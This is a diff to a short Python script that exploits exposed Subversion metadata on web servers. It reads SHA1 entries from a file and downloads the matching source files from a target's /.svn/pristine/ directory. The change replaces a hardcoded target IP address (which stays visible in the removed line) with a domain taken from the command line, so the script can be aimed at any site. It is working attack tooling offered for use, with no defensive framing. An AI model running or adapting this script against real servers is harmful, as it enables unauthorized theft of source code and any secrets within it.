@@ -2,14 +2,16 @@
 import hackhttp
 import re
 import os
-def GetFile(Filename,sha1):
+import sys
+def GetFile(domain,Filename,sha1):
 	hh = hackhttp.hackhttp()
-	Url = "http://106.75.71.16/admin/.svn/pristine/"+str(sha1)[0:2]+"/"+str(sha1)+".svn-base"
+	Url = domain+"/.svn/pristine/"+str(sha1)[0:2]+"/"+str(sha1)+".svn-base"
 	a,b,c,d,e = hh.http(Url)
 	fp = open(Filename,"w")
 	fp.write(c)
 	fp.close()	
 if __name__ == '__main__':
+	domain = sys.argv[1]
 	i=0
 	f = open("1.txt","r")
 	while 1:
@@ -29,5 +31,5 @@ if __name__ == '__main__':
 					os.makedirs(Dir)
 
 				if "." in dirs:
-					GetFile(dirs,sha1)	
+					GetFile(domain,dirs,sha1)	
 	f.close()
